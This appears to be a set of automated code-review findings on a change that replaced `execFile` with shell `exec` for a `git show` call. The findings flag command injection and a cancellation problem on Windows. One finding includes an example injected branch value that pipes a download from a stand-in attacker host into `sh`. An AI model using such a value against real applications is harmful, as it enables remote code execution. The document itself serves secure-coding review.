findings.title: [P1] Pass the branch as an argv element
findings.body: When `branch` contains shell syntax such as `main; <command>` or `$(<command>)`, `exec` interprets it and executes arbitrary commands with the application's privileges. The previous `execFile("git", ["show", branch])` implementation passed the branch directly to Git without shell parsing. Restore argument-separated process execution.

findings.title: [P2] Keep `git` as the cancellable child process
findings.body:
`exec()` returns the shell process rather than necessarily returning `git`. On Windows, calling `.kill()` terminates `cmd.exe` but can leave a long-running `git show` descendant alive, holding output pipes and repository resources. POSIX shell constructs in valid branch names can cause the same issue. Previously, `execFile()` returned and killed `git` directly.

_Recommend validating this comment independently._

findings.title: [P1] Pass the branch as an `execFile` argument instead of shell interpolation
findings.body:
`exec` invokes a shell, so a caller-controlled value such as `main; <command>` executes arbitrary commands even if the Git ref is invalid. The previous implementation passed the value directly to Git without shell interpretation.

_Recommend validating this comment independently._

findings.title: [P1] Restore argument-separated execution to prevent shell command injection
findings.body:
`exec()` invokes a shell and interpolates `branch` verbatim. Any attacker-controlled branch value containing shell syntax, such as `main; curl attacker/payload | sh`, executes arbitrary commands with the application’s privileges. The previous `execFile("git", ["show", branch])` treated the value as a single argument.

_Recommend validating this comment independently._
